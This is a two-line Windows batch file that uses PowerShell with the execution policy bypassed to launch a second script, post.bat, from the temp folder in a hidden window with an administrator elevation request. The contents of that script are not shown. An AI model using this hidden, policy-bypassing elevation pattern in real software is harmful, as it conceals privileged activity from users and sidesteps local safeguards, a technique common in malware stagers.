@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process -FilePath '%temp%\post.bat' -WindowStyle Hidden -Verb RunAs}"
